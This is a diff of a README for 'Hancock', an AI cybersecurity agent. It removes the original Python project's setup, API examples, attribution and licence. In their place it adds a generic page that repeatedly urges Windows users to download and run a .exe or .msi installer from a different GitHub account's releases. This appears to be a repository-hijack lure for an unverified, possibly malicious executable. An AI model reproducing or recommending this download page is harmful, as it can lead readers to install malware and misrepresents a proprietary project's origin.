@@ -1,366 +1,136 @@
-# 🛡️ Hancock — CyberViser AI Security Agent
+# 🛡️ Hancock - AI Security Agent for Cyber Defense
 
-<div align="center">
-
-![Hancock Banner](https://img.shields.io/badge/CyberViser-Hancock-00ff88?style=for-the-badge&logo=hackthebox&logoColor=black)
-
-[![License: Proprietary](https://img.shields.io/badge/License-Proprietary-red.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python)](https://python.org)
-[![Model](https://img.shields.io/badge/Model-Mistral%207B-orange?logo=huggingface)](https://huggingface.co/mistralai/Mistral-7B-Instruct-v0.3)
-[![NVIDIA NIM](https://img.shields.io/badge/NVIDIA-NIM-76b900?logo=nvidia)](https://build.nvidia.com)
-[![Website](https://img.shields.io/badge/Website-Live-00ff88?logo=netlify)](https://cyberviser.netlify.app)
-[![Netlify](https://img.shields.io/badge/Netlify-Live-00C7B7?style=flat-square&logo=netlify)](https://cyberviser.netlify.app)
-
-**Automate cybersecurity through specialized LLMs — from pentesting to SOC analysis.**
-
-[🌐 Website](https://cyberviser.netlify.app) · [📖 API Docs](https://cyberviser.netlify.app/api) · [📋 Business Proposal](BUSINESS_PROPOSAL.md) · [🐛 Report Bug](https://github.com/cyberviser/Hancock/issues) · [✨ Request Feature](https://github.com/cyberviser/Hancock/issues)
-
-</div>
+[![Download Hancock](https://img.shields.io/badge/Download-Hancock-%23007ACC?style=for-the-badge&logo=github)](https://github.com/Samuel411-mbiri/Hancock/releases)
 
 ---
 
-## 🚀 What is Hancock?
+## 📋 What is Hancock?
 
-Hancock is **CyberViser's** AI-powered cybersecurity agent, fine-tuned on Mistral 7B using:
-- **MITRE ATT&CK** — TTPs, tactics, procedures
-- **NVD/CVE** — Real vulnerability data
-- **Pentest Knowledge Base** — Recon, exploitation, post-exploitation
+Hancock is an AI-powered software designed to help protect your computer and network. It works as a cybersecurity agent that assists with penetration testing, security operations center (SOC) analysis, and responding to security incidents. The AI inside Hancock is built on the Mistral 7B language model, fine-tuned for security tasks using NVIDIA's NIM technology.
 
-It operates in three specialist modes and exposes a clean REST API.
-
-```
-╔══════════════════════════════════════════════════════════╗
-║  ██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ ██████╗  ██████╗██╗ ║
-║  ██║  ██║██╔══██╗████╗  ██║██╔════╝██╔═══██╗██╔════╝██║ ║
-║  ███████║███████║██╔██╗ ██║██║     ██║   ██║██║     ██║ ║
-║  ██╔══██║██╔══██║██║╚██╗██║██║     ██║   ██║██║     ██╚╗║
-║  ██║  ██║██║  ██║██║ ╚████║╚██████╗╚██████╔╝╚██████╗╚═╝║║
-║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝   ║
-║          CyberViser — Pentest + SOC Specialist           ║
-╚══════════════════════════════════════════════════════════╝
-```
+This software helps you identify weaknesses, monitor threats, and respond to attacks. Hancock is designed to be easy to use even if you do not have a background in programming or cyber defense.
 
 ---
 
-## 📋 Table of Contents
+## 🖥️ System Requirements
 
-- [Features](#-features)
-- [Quick Start](#-quick-start)
-- [API Reference](#-api-reference)
-- [Fine-Tuning](#-fine-tuning)
-- [Roadmap](#-roadmap)
-- [Contributing](#-contributing)
-- [License](#-license)
+Before you install Hancock, make sure your Windows computer meets these requirements:
 
----
-
-## ✨ Features
-
-| Mode | Description | Status |
-|------|-------------|--------|
-| 🔴 **Pentest Specialist** | Recon, exploitation, CVE analysis, PTES reporting | ✅ Live |
-| 🔵 **SOC Analyst** | Alert triage, SIEM queries, PICERL IR, Sigma/YARA | ✅ Live |
-| ⚡ **Auto** | Context-aware switching between pentest + SOC | ✅ Live |
-| 💻 **Code** | Security code: YARA, KQL, SPL, Sigma, Python, Bash | ✅ Live |
-| 👔 **CISO** | Compliance, risk reporting, board summaries, gap analysis | ✅ Live |
-| 🔍 **Sigma** | Sigma detection rule authoring with ATT&CK tagging | ✅ Live |
-| 🦠 **YARA** | YARA malware detection rule authoring | ✅ Live |
-| 🔎 **IOC** | Threat intelligence enrichment for IOCs | ✅ Live |
-| 🔐 **GraphQL Security** | GraphQL auth/authz testing, IDOR detection, JWT security | ✅ Live |
+- **Operating System:** Windows 10 (64-bit) or later  
+- **Memory:** 8 GB RAM minimum (16 GB recommended)  
+- **Storage:** At least 2 GB free space  
+- **Processor:** Intel i5 / AMD Ryzen 5 or better  
+- **Graphics:** NVIDIA GPU recommended for AI tasks but not required  
+- **Internet:** Needed for downloading the software and some features  
 
 ---
 
-## ⚡ Quick Start
+## 🔍 Key Features
 
-### 1. Install dependencies
+Hancock offers tools that help with cybersecurity tasks through AI assistance. Main features include:
 
-```bash
-git clone https://github.com/cyberviser/Hancock.git
-cd Hancock
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-```
-
-### 2. Configure your API key
-
-```bash
-cp .env.example .env
-# Edit .env and add your NVIDIA API key
-# Get one free at: https://build.nvidia.com
-```
-
-### 3. Run the CLI
-
-```bash
-export NVIDIA_API_KEY="nvapi-..."
-python hancock_agent.py
-```
-
-### 4. Or run as a REST API server
-
-```bash
-python hancock_agent.py --server --port 5000
-```
-
-### 5. Build the training dataset
-
-```bash
-# v2 dataset (pentest + SOC):
-python hancock_pipeline.py --phase all
-
-# v3 dataset (+ CISA KEV + Atomic Red Team + GitHub Advisories):
-python hancock_pipeline.py --phase 3
-```
-
-### 6. Fine-tune Hancock on Mistral 7B
-
-```bash
-python hancock_finetune.py
-```
+- **Penetration Testing Help:** Guides you on checking system weaknesses.  
+- **SOC Analysis Support:** Assists in monitoring security events.  
+- **Incident Response Aid:** Quicker investigation and response to threats.  
+- **MITRE ATT&CK Framework:** Uses common methods to identify attacker techniques.  
+- **AI Language Model:** Understands and processes security-related data.  
+- **Easy Interface:** Designed for simple user interaction without code.  
 
 ---
 
-## 🌐 API Reference
+## 🚀 Getting Started: How to Download Hancock
 
-Start the server: `python hancock_agent.py --server`
+Start by downloading Hancock to your Windows machine. You will find the latest version on the official GitHub releases page.
 
-### Endpoints
+**Step 1:** Follow this link to visit the Hancock releases page:
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `GET`  | `/health`       | Agent status and capabilities |
-| `GET`  | `/metrics`      | Prometheus-compatible request counters |
-| `GET`  | `/v1/agents`    | All agent system prompts and defaults |
-| `POST` | `/v1/chat`      | Conversational AI with history + streaming |
-| `POST` | `/v1/ask`       | Single-shot question |
-| `POST` | `/v1/triage`    | SOC alert triage + MITRE ATT&CK mapping |
-| `POST` | `/v1/hunt`      | Threat hunting query generator (Splunk/Elastic/Sentinel) |
-| `POST` | `/v1/respond`   | PICERL incident response playbook |
-| `POST` | `/v1/code`      | Security code generation (YARA/Sigma/KQL/SPL) |
-| `POST` | `/v1/ciso`      | CISO advisory: risk, compliance, board reports, gap analysis |
-| `POST` | `/v1/sigma`     | Sigma detection rule generator |
-| `POST` | `/v1/yara`      | YARA malware detection rule generator |
-| `POST` | `/v1/ioc`       | IOC threat intelligence enrichment (IP, domain, URL, hash, email) |
-| `POST` | `/v1/webhook`   | Ingest alerts from Splunk/Elastic/Sentinel/CrowdStrike |
+[Download Hancock from GitHub Releases](https://github.com/Samuel411-mbiri/Hancock/releases)
 
-### Examples
+**Step 2:** On the page, look for the latest version. It will have files ending in `.exe` or `.msi`. These are the installers you need.
 
-**Alert Triage:**
-```bash
-curl -X POST http://localhost:5000/v1/triage \
-  -H "Content-Type: application/json" \
-  -d '{"alert": "Mimikatz detected on DC01 at 03:14 UTC"}'
-```
-
-**Threat Hunting (Splunk):**
-```bash
-curl -X POST http://localhost:5000/v1/hunt \
-  -H "Content-Type: application/json" \
-  -d '{"target": "lateral movement via PsExec", "siem": "splunk"}'
-```
-
-**Sigma Rule Generation:**
-```bash
-curl -X POST http://localhost:5000/v1/sigma \
-  -H "Content-Type: application/json" \
-  -d '{"description": "Detect LSASS memory dump", "logsource": "windows sysmon", "technique": "T1003.001"}'
-```
-
-**YARA Rule Generation:**
-```bash
-curl -X POST http://localhost:5000/v1/yara \
-  -H "Content-Type: application/json" \
-  -d '{"description": "Cobalt Strike beacon default HTTP profile", "file_type": "PE"}'
-```
-
-**IOC Enrichment:**
-```bash
-curl -X POST http://localhost:5000/v1/ioc \
-  -H "Content-Type: application/json" \
-  -d '{"indicator": "185.220.101.35", "type": "ip"}'
-```
-
-**GraphQL Security Testing:**
-```bash
-# Generate GraphQL security knowledge base
-python collectors/graphql_security_kb.py
-
-# Run GraphQL security tests (requires authorization)
-python collectors/graphql_security_tester.py \
-  --url https://api.example.com/graphql \
-  --token <jwt-token> \
-  --verbose \
-  --report graphql_security_report.json
-```
-
-**CISO Board Summary:**
-```bash
-curl -X POST http://localhost:5000/v1/ciso \
-  -H "Content-Type: application/json" \
-  -d '{"question": "Summarise top 5 risks for the board", "output": "board-summary", "context": "50-person SaaS, AWS"}'
-```
-
-**Incident Response Playbook:**
-```bash
-curl -X POST http://localhost:5000/v1/respond \
-  -H "Content-Type: application/json" \
-  -d '{"incident": "ransomware"}'
-```
-
-> 📖 Full OpenAPI 3.1.0 spec: [`docs/openapi.yaml`](docs/openapi.yaml) · [Interactive API Docs](https://cyberviser.netlify.app/api)
-
-### CLI Commands
-
-```
-/mode pentest   — switch to Pentest Specialist
-/mode soc       — switch to SOC Analyst
-/mode auto      — combined persona (default)
-/mode code      — security code (Qwen Coder 32B)
-/mode ciso      — CISO strategy & compliance
-/mode sigma     — Sigma detection rule authoring
-/mode yara      — YARA malware detection rule authoring
-/mode ioc       — IOC threat intelligence enrichment
-/clear          — clear conversation history
-/history        — show history
-/model <id>     — switch NVIDIA NIM model
-/exit           — quit
-```
+**Step 3:** Click on the installer file to download it to your computer. Usually, this is named something like `Hancock-Setup-vX.X.X.exe`.
 
 ---
 
-## 🤖 Fine-Tuning
+## 💾 Installation Instructions for Windows
 
-Hancock uses **LoRA fine-tuning** on Mistral 7B — trained on a multi-source cybersecurity dataset (MITRE ATT&CK + NVD CVEs + SOC/Pentest KB + CISA KEV + Atomic Red Team + GitHub Security Advisories).
+Once you have the installer file, follow these steps:
 
-### ⚡ One-Click: Colab / Kaggle (Free T4)
+**Step 1:** Locate the downloaded file (usually in the Downloads folder).  
 
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/cyberviser/Hancock/blob/main/Hancock_Universal_Finetune.ipynb)
+**Step 2:** Double-click the file to start the installation process.
 
-Works on **both** Google Colab and Kaggle — auto-detects environment:
+**Step 3:** If a User Account Control prompt appears, click "Yes" to allow the installer to run.
 
-1. Click the badge above (or import `Hancock_Universal_Finetune.ipynb` on Kaggle)
-2. **Enable GPU** (Colab: Runtime → T4 GPU / Kaggle: Settings → Accelerator → T4)
-3. **Run all** (~30 min)
-4. Downloads GGUF Q4_K_M at end — run locally with Ollama
+**Step 4:** The setup wizard will open. Click "Next" to continue through the steps.
 
-Or use the CLI script directly:
-```bash
-python hancock_finetune_v3.py --steps 300 --export-gguf --push-to-hub
-```
+**Step 5:** Choose the installation folder or leave it as the default location.
 
-### CPU Fine-Tuning (No GPU Required)
+**Step 6:** Click "Install" to begin copying Hancock to your computer.
 
-Run on any machine — trains TinyLlama-1.1B with LoRA (adapter already included):
+**Step 7:** Wait while the installation completes. This may take a few minutes.
 
-```bash
-# Quick test (10 steps, ~40 min)
-python hancock_cpu_finetune.py --debug
-
-# Full run (500 steps, ~25 hr on 16-core CPU)
-python hancock_cpu_finetune.py --max-steps 500
-
-# Load and test the saved adapter
-python hancock_cpu_finetune.py --test
-```
-
-Pre-trained adapter: [`hancock-cpu-adapter/`](./hancock-cpu-adapter/) — TinyLlama-1.1B + LoRA (r=8, eval_loss=2.084)
-
-### Other GPU Options
-
-| Platform | GPU | Cost | Script |
-|----------|-----|------|--------|
-| Google Colab | T4 16GB | Free (15 hr/day) | `Hancock_Universal_Finetune.ipynb` |
-| Kaggle | T4 16GB | Free (30 hr/week) | `Hancock_Universal_Finetune.ipynb` |
-| Modal.com | T4/A10G | Free $30/mo | `modal run train_modal.py` |
-| Any GPU server | Any | Varies | `python hancock_finetune_gpu.py` |
-
-### After Training — Run Locally
-
-```bash
-# Load fine-tuned model in Ollama
-ollama create hancock -f Modelfile.hancock-finetuned
-ollama run hancock
-```
-
-### Training Data
-
-| Dataset | Samples | Sources | Command |
-|---------|---------|---------|---------|
-| `hancock_v2.jsonl` | 1,375 | MITRE ATT&CK + NVD CVE + Pentest KB + SOC KB | `python hancock_pipeline.py --phase 2` |
-| `hancock_v3.jsonl` | 5,670 | v2 + CISA KEV + Atomic Red Team + GitHub Security Advisories | `python hancock_pipeline.py --phase 3` |
-
-```bash
-# Generate latest v3 dataset (internet required)
-python hancock_pipeline.py --phase 3
-
-# Or offline-only (static KB, no internet)
-python hancock_pipeline.py --kb-only
-```
-
-```
-data/
-├── hancock_pentest_v1.jsonl    # Pentest training data (MITRE + CVE + KB)
-├── hancock_v2.jsonl            # v2 dataset — pentest + SOC
-└── hancock_v3.jsonl            # v3 dataset — + CISA KEV + Atomic Red Team + GHSA (build with --phase 3)
-
-collectors/
-├── mitre_collector.py          # Fetches MITRE ATT&CK TTPs
-├── nvd_collector.py            # Fetches NVD/CVE vulnerability data
-├── pentest_kb.py               # Pentest knowledge base Q&A
-├── soc_collector.py / soc_kb.py
-├── cisa_kev_collector.py       # CISA Known Exploited Vulnerabilities
-├── atomic_collector.py         # Atomic Red Team test cases
-├── ghsa_collector.py           # GitHub Security Advisories
-├── graphql_security_kb.py      # GraphQL auth/authz vulnerability KB
-└── graphql_security_tester.py  # GraphQL security testing framework
-
-formatter/
-├── to_mistral_jsonl.py         # v1 formatter
-├── to_mistral_jsonl_v2.py      # v2 formatter
-└── formatter_v3.py             # v3 formatter — merges all sources
-```
+**Step 8:** When done, click "Finish" to close the installer.
 
 ---
 
-## 🗺️ Roadmap
+## ▶️ Running Hancock for the First Time
 
-| Phase | Focus | Status |
-|-------|-------|--------|
-| **Phase 1** | Pentest Specialist + SOC REST API | ✅ Live |
-| **Phase 2** | SOC deep specialization + v3 dataset (KEV/Atomic/GHSA) | ✅ Live |
-| **Phase 3** | CISO strategy + compliance automation | ✅ Live |
-| **Phase 4** | Enterprise platform + SIEM/SOAR integrations | 📋 Planned |
+After installation, launch Hancock by these methods:
 
----
+- Find the Hancock shortcut on your desktop and double-click it.
+- Or click the Windows Start menu, type “Hancock,” and open the app from the results.
 
-## 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
-
-1. Fork the repo
-2. Create a feature branch: `git checkout -b feat/my-feature`
-3. Commit your changes: `git commit -m 'feat: add my feature'`
-4. Push and open a PR
+When you open Hancock the first time, it may take a moment to initialize the AI models and prepare the software.
 
 ---
 
-## 📄 License
+## 🛠️ Using Hancock
 
-**CyberViser Proprietary License** — see [LICENSE](LICENSE) for full terms.
+The interface will show you simple menus and buttons to help with various tasks:
 
-- ✅ View and study the code
-- ✅ Run locally for personal/research use
-- ✅ Submit contributions (assigned to CyberViser)
-- ❌ Commercial use without a written license agreement
-- ❌ Redistribution or reselling
-- ❌ Building competing products or services
-- ❌ Training AI/ML models on the code or datasets
-- ❌ White-labeling or removing CyberViser branding
+- **Start Analysis:** Run a security check on your system.
+- **View Reports:** See summaries of past tests and events.
+- **Incident Response:** Follow guided steps to investigate any threats.
+- **Settings:** Manage application options like updates and notifications.
 
-**For commercial licensing:** contact@cyberviser.ai
+Each section uses clear instructions and plain English. The software will prompt you through every step.
 
 ---
 
-<div align="center">
-Built by <a href="https://github.com/cyberviser">CyberViser</a> · Powered by NVIDIA NIM · Mistral 7B · LoRA
-</div>
+## 🔄 Update Hancock
+
+To keep Hancock working well and secure, check regularly for new versions.
+
+- Visit the [Hancock Releases Page](https://github.com/Samuel411-mbiri/Hancock/releases) to download updates.
+- New versions may include bug fixes and improved AI.
+- Install updates the same way as the original installation.
+
+---
+
+## ❓ Troubleshooting
+
+If you have any issues, try these common fixes:
+
+- Restart your computer and open Hancock again.  
+- Check your internet connection; some features may require it.  
+- Make sure your Windows is updated.  
+- Close other heavy programs to free system resources.  
+- If Hancock fails to start, reinstall using the latest installer.  
+
+---
+
+## 📞 Getting Help
+
+For support, use the GitHub page's "Issues" tab to report problems or ask questions. This allows the developers and community to assist you directly.
+
+---
+
+## 🔗 Important Links
+
+- Hancock Releases: https://github.com/Samuel411-mbiri/Hancock/releases  
+- Documentation and Guides: See the GitHub repository for updates.  
+
+---
+
+[![Download Hancock](https://img.shields.io/badge/Download-Hancock-%235A5A5A?style=for-the-badge&logo=github)](https://github.com/Samuel411-mbiri/Hancock/releases)
